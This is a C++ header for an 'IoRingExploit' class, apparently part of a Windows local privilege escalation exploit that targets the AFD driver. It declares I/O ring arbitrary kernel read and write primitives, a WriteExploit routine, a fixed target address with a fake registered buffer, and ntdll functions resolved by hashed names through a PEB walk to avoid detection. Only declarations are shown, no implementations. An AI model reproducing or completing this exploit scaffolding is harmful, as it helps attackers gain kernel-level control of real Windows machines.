#pragma once
#include "Framework.hpp"

#include <Windows.h>
#include <string>
#include <memory>
#include <vector>
#include <ioringapi.h>
#include <mutex>




class IoRingExploit
{
private:
	/// <summary>
	/// exploit
	/// </summary>
	std::wstring afdDevice;
	HANDLE completionHandle = nullptr;
	HANDLE socketHandle = nullptr;
	HANDLE eventHandle = nullptr;


	/// <summary>
	/// ioring
	/// </summary>
	HIORING ioRingHandle = { nullptr };
	PIORING_OBJECT ioRingObject =  nullptr;
	HANDLE inputPipeHandle = nullptr;
	HANDLE outputPipeHandle = nullptr;
	HANDLE inputPipeFileHandle = nullptr;
	HANDLE outputPipeFileHandle = nullptr;

	void* targetAddress = (void*)0x1000000;
	void* fakeRegBuffer = nullptr;

	/// <summary>
	/// for fectching functions
	/// </summary>
	std::vector<FUNCTION_PTRS> functionPointers{};
	

	std::uint32_t ntdllHash;

private:

	struct
	{
		std::uint32_t ntCreateIoCompletionHash;
		std::uint32_t ntRemoveIoCompletionHash;
		std::uint32_t ntSetIoCompletionHash;
		std::uint32_t ntOpenFileHash;
		std::uint32_t ntCreateFileHash;
		std::uint32_t ntDeviceIoControlFileHash;
		std::uint32_t ntQuerySystemInformationHash;
		std::uint32_t ntQueryInformationFileHash;
		std::uint32_t ntAllocateVirtualMemoryHash;
		std::uint32_t ntFreeVirtualMemoryHash;
		std::uint32_t ntCloseHash;
		std::uint32_t ntReadFileHash;
		std::uint32_t ntWriteFileHash;
		std::uint32_t ntCreateEventHash;
		std::uint32_t ntCreateIoRingHash;
		std::uint32_t ntCreateNamedPipeFileHash;
	}ntdllHashedNames;

private:
	/// <summary>
	/// util functions
	/// </summary>
	bool FetchFunctionPtrsUtil();
	void* FunctionAddrUtil(__in std::uint_least32_t hashedModuleName, __in std::uint32_t hashedProcName);
	PBYTE PebModuleUtil(__in std::uint32_t hashedModuleName);
	bool FetchObjectPtrUtil(__in ULONG procPid, __in HANDLE targetHandle, __out PULONG64 objectPtr);
	template<typename input> bool StringConversionUtil(__in void* destination, __in  input source);
	void* Fetch_Function(std::uint32_t hashedName);

public:
	void* SigScannerUtil(__in void* memoryRegion, __in std::size_t length, __in void* sigBuffer, __in std::size_t sigLength);
	PIMAGE_NT_HEADERS64 FetchNtHeaderUtil(__in void* imageBase);
	void* FetchModuleBaseUtil(__in std::uint32_t moduleName);
	

private:
	/// <summary>
/// ioring functions
/// </summary>
	bool IoRingRead(__out PULONG64 registerBuffers, __in ULONG64 readAddress, __in void* readBuffer, __in ULONG readLength);
	bool IoRingWrite(__out PULONG64 registerBuffers, __in ULONG64 writeAddress, __in void* writeBuffer, __in ULONG writeLength);
	void IoRingSetupCleanup();

public:

	bool IoRingSetup(__in PIORING_OBJECT* ioRingObjPtr);
	bool IoRingReadHelper(__in ULONG64 readAddress, void* readBuffer, __in ULONG readLength);
	bool IoRingWriteHelper(__in ULONG64 writeAddress, void* writeBuffer, __in ULONG writeLength);
	bool IoRingRundownProtection();

	/// <summary>
	/// exploit function
	/// </summary>
	bool WriteExploit(__in void* targetAddress, __in void* extendedAttributes, __in std::size_t szExtendedAttributes);
	void ExploitCleanup(__in ULONG handleFreeFlag);

	
	
	bool IoRingExploitInit();

	::IoRingExploit(bool* initCheck)
	{
		if (!this->IoRingExploitInit())
		{
			*initCheck = false;
			return;
		}

		*initCheck = true;
	}
};





//PHANDLE IoCompletionHandle,ACCESS_MASK DesiredAccess,OBJECT_ATTRIBUTES* ObjectAttributes,DWORD NumberOfConcurrentThreads
using fnNtCreateIoCompletion = NTSTATUS (__fastcall*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, DWORD);


//HANDLE IoCompletionHandle,PUINT_PTR KeyContext,PUINT_PTR ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER Timeout
using fnNtRemoveIoCompletion = NTSTATUS (__fastcall*)(HANDLE, PUINT_PTR, PUINT_PTR, PIO_STATUS_BLOCK, PLARGE_INTEGER);


//HANDLE IoCompletionHandle,UINT_PTR KeyContext,UINT_PTR ApcContext,UINT_PTR Status,UINT_PTR IoStatusInformation
using fnNtSetIoCompletion = NTSTATUS (__fastcall*)(HANDLE, UINT_PTR, UINT_PTR, UINT_PTR, UINT_PTR);


//HANDLE  FileHandle,HANDLE Event,PVOID ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG IoControlCode,PVOID InputBuffer,ULONG InputBufferLength,PVOID OutputBuffer,ULONG OutputBufferLength
using fnNtDeviceIoControlFile = NTSTATUS (__fastcall*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);


//FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, CreateDisposition, CreateOptions, NamedPipeType, ReadMode, CompletionMode, MaximumInstances, InboundQuota, OutboundQuota, DefaultTimeout
using fnNtCreateNamedPipeFile = NTSTATUS(__fastcall*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, PLARGE_INTEGER);


using fnNtCreateEvent = NTSTATUS(__fastcall*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, EVENT_TYPE, BOOLEAN);

using fnNtQuerySystemInformation = NTSTATUS (__fastcall*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

using fnNtQueryInformationFile = NTSTATUS (__fastcall*)(HANDLE, PIO_STATUS_BLOCK, PVOID, DWORD, FILE_INFORMATION_CLASS);

using fnNtAllocateVirtualMemory = NTSTATUS (__fastcall*)(HANDLE, PVOID*, DWORD64, PSIZE_T, DWORD, DWORD);

using fnNtFreeVirtualMemory = NTSTATUS (__fastcall*)(HANDLE, PVOID, PSIZE_T, DWORD);

using fnNtCLose = NTSTATUS (__fastcall*)(HANDLE);

using fnNtCreateFile = NTSTATUS (__fastcall*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

using fnNtWriteFile = NTSTATUS(__fastcall*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);

